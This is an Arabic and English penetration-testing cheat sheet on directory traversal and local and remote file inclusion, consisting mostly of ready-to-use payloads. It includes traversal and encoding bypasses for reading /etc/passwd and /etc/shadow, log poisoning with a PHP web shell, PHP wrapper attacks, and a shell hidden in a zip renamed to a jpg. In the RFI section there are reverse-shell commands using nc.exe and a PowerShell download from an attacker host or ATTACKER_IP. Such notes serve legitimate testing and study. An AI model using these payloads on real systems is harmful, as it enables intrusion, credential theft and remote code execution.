

# 🧪 Directory Traversal & File Inclusion – Practical Checklist

---

## ✅ المرحلة 1: اكتشاف Directory Traversal

### 🔍 أماكن الفحص

- Parameters مثل:
    
    - `file=`
        
    - `page=`
        
    - `path=`
        
    - `template=`
        
    - `include=`
        
    - `doc=`
        
- Endpoints:
    
    - PDF viewer
        
    - Image download
        
    - Language switcher
        
    - Backup / export features
        

---

### 🧱 Payloads أساسية

```
../
../../
../../../
../../../../
```

### 🧱 Bypass Filters

```
..%2f
..%252f
%2e%2e/
%2e%2e%2f
....//
```

---

### 📂 ملفات اختبار

**Linux**

```
/etc/passwd
/etc/hosts
/proc/self/environ
```

**Windows**

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

✅ **نجاح المرحلة** = قدرت تقرأ ملف خارج مجلد التطبيق

---

## ✅ المرحلة 2: تأكيد LFI (Local File Inclusion)

### 🔎 علامات LFI

- الملف يتم **تنفيذه أو تفسيره**
    
- أخطاء PHP واضحة
    
- اختلاف في الاستجابة عند تضمين ملفات مختلفة
    

---

### 📄 ملفات مهمة للفحص

```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/proc/self/environ
```

---

## ✅ المرحلة 3: Log Poisoning (تحويل LFI إلى RCE)

### 🧨 الفكرة

حقن كود PHP داخل log → تضمينه عبر LFI

### 🧪 مثال Header

```
User-Agent: <?php system($_GET['cmd']); ?>
```

### 🔗 الاستدعاء

```
?page=../../../../var/log/apache2/access.log&cmd=id
```

🔥 **لو نجح → RCE**

---

## ✅ المرحلة 4: RFI (Remote File Inclusion)

> ⚠️ نادر لكنه Critical

### 🔍 الشروط

- `allow_url_include = On`
    
- التطبيق يستخدم include/require بدون فلترة
    

### 🧪 اختبار

```
?page=http://attacker.com/test.txt
```

---

## 🧠 ملاحظات Bug Bounty

- Directory Traversal فقط → غالبًا Low / Medium
    
- LFI → Medium / High
    
- LFI + RCE → High / Critical
    
- RFI → Critical
    

---

## 3. أساليب الاستغلال (Payloads شائعة)

### 3.1. Path traversal / Basic payloads

- قراءة ملف passwd:
    

```
http://example.com/index.php?page=../../../etc/passwd
```

- قراءة shadow:
    

```
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

### 3.2. URL encoding

- مسارات مشفّرة:
    

```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 3.3. Double encoding

```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 3.4. UTF-8 encoding

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### 3.5. Null byte injection (قديم ــ يعتمد على لغة/إصدار الخادم)

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### 3.6. From an existent folder (مسارات نسبية)

```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

### 3.7. Path truncation / weird traversal

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[...]/././.
```

---

## 4. PHP Wrappers — تقنيات متقدمة لقراءة/تنفيذ الملفات

> ملاحظة: وجود هذه الـ wrappers يعتمد على إعدادات PHP (allow_url_include, allow_url_fopen، والتوسيطات المفعلة).

### 4.1. php://filter — قراءة الكود أو base64

- قراءة ملف كـ ROT13:
    

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
```

- إرجاع ملف مشفّر بـ base64:
    

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

### 4.2. zlib (ضغط)

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

### 4.3. zip stream — استخراج ملف من داخل zip

خطوات:

1. أنشئ ملف PHP بسيط:
    

```bash
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg
rm payload.php
```

2. اطلب:
    

```
http://example.com/index.php?page=zip://shell.jpg#payload.php
```

### 4.4. data:// — حقن كود مباشر (Base64)

```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

(القيمة هنا هي base64 لكود PHP)

### 4.5. expect:// — تنفيذ أوامر نظام (إن مفعّل)

```
http://example.com/index.php?page=expect://ls
```

### 4.6. php://input — تمرير كود عبر POST body

```
POST /index.php?page=php://input&cmd=ls HTTP/1.1
Host: example.com

<?php echo shell_exec($_GET['cmd']); ?>
```

---

## 5. حيل تجاوز خاصة (Bypass tricks)

- أشكال غير عادية من `..`:
    

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
```

- مزج encoding و escape sequences:
    

```
http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

- استخدام تمثيلات `%` متكررة:
    

```
http://example.com/index.php?page=/%%32%65%%32%65/.../etc/passwd
```

- استبدال separators (backslash/forward slash) في أنظمة معيّنة:
    

```
http://example.com/index.php?page=/%5C../%5C../.../etc/passwd
```

---

## Tools



Copy

```http
# https://github.com/kurobeats/fimap
fimap -u "http://10.11.1.111/example.php?test="
# https://github.com/P0cL4bs/Kadimus
./kadimus -u localhost/?pg=contact -A my_user_agent
# https://github.com/wireghoul/dotdotpwn
dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
# Apache specific: https://github.com/imhunterand/ApachSAL
```

**How to**

1. Look requests with filename like `include=main.inc template=/en/sidebar file=foo/file1.txt`
    
2. Modify and test: `file=foo/bar/../file1.txt`
    
    1. If the response is the same could be vulnerable
        
    2. If not there is some kind of block or sanitizer
        
    
3. Try to access world-readable files like `/etc/passwd /win.ini`
    

## 

[](https://pentestbook.six2dez.com/enumeration/web/lfi-rfi#lfi)

LFI

Copy

```http
# Basic LFI
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd

# If LFI, also check
/var/run/secrets/kubernetes.io/serviceaccount

# PHP Filter b64
http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
# Nullbyte ending
http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
# Other techniques
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd
https://abc.redact.com/asd.php?file:///etc/passwd%00
https://abc.redact.com/asd.php?file:///etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
https://target.com/admin..;/
https://target.com/../admin
https://target.com/whatever/..;/admin
https://target.com/whatever.php~
# Cookie based
GET /vulnerable.php HTTP/1.1
Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext

# LFI using video upload:
https://github.com/FFmpeg/FFmpeg
https://hackerone.com/reports/226756
https://hackerone.com/reports/237381
https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
https://github.com/neex/ffmpeg-avi-m3u-xbin

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# Common LFI to RCE:
    Using file upload forms/functions
    Using the PHP wrapper expect://command
    Using the PHP wrapper php://file
    Using the PHP wrapper php://filter
    Using PHP input:// stream
    Using data://text/plain;base64,command
    Using /proc/self/environ
    Using /proc/self/fd
    Using log files with controllable input like:
        /var/log/apache/access.log
        /var/log/apache/error.log
        /var/log/vsftpd.log
        /var/log/sshd.log
        /var/log/mail

# LFI possibilities by filetype
    ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
    SVG: Stored XSS / SSRF / XXE
    GIF: Stored XSS / SSRF
    CSV: CSV injection
    XML: XXE
    AVI: LFI / SSRF
    HTML / JS : HTML injection / XSS / Open redirect
    PNG / JPEG: Pixel flood attack (DoS)
    ZIP: RCE via LFI / DoS
    PDF / PPTX: SSRF / BLIND XXE
    
# Chaining with other vulns    
../../../tmp/lol.png —> for path traversal
sleep(10)-- -.jpg —> for SQL injection
<svg onload=alert(document.domain)>.jpg/png —> for XSS
; sleep 10; —> for command injections

# 403 bypasses
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
/secret/
/secret/.
//secret//
/./secret/..
/admin..;/
/admin%20/
/%20admin%20/
/admin%20/page
/%61dmin

# Path Bypasses
# 16-bit Unicode encoding
# double URL encoding
# overlong UTF-8 Unicode encoding
….//
….\/
…./\
….\\
```

## RFI
[](https://pentestbook.six2dez.com/enumeration/web/lfi-rfi#rfi)

```http
# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
# Start SMB Server in attacker machine and put evil script
# Access it via browser (2 request attack):
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

# Cross Content Hijacking:
https://github.com/nccgroup/CrossSiteContentHijacking
https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
http://50.56.33.56/blog/?p=242

# Encoding scripts in PNG IDAT chunk:
https://yqh.at/scripts_in_pngs.php
```